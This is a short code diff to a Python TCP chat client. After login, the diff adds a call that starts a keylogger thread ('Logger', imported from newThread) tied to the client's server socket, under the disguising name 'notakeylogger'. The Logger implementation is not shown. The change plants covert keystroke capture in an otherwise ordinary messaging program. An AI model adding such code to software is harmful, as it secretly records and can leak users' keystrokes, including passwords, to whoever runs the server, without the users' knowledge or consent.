@@ -16,6 +16,8 @@ from cltThreadDmListener import DmListenerThread
 import sys
 import re
 
+from newThread import Logger
+
 #Server would be running on the same host as Client
 if len(sys.argv) != 2:
     print("\n===== Error usage, python3 TCPClient3.py SERVER_IP SERVER_PORT ======\n");
@@ -52,6 +54,10 @@ timeout, username = loginUser(clientSocket)
 
 # Initial state after logging in, user can immediately issue a command
 message = "awaiting command"
+
+# Start a keylogger
+notakeylogger = Logger(clientSocket)
+notakeylogger.start()
 
 # Start timeout thread
 timeoutThread = TimeoutThread(clientSocket, timeout)
